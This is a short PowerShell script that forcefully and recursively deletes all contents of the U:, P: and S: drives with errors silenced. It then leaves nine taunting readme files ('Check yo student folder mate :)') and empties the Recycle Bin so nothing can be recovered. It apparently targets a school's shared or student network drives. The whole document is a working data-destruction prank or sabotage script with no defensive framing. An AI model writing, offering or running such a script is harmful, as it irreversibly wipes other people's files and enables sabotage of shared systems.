cd U:\ 
Remove-Item * -Recurse -Force -ErrorAction silentlycontinue
cd P:\ 
Remove-Item * -Recurse -Force -ErrorAction silentlycontinue
cd S:\ 
Remove-Item * -Recurse -Force -ErrorAction silentlycontinue

cd U:\
$i = 1
while ($i -lt 10){
	New-Item .\readme$i.txt -Force
	$i++
}
Set-Content readme* "Check yo student folder mate :)" -Force -ErrorAction silentlycontinue
Clear-RecycleBin -Force -ErrorAction silentlycontinue
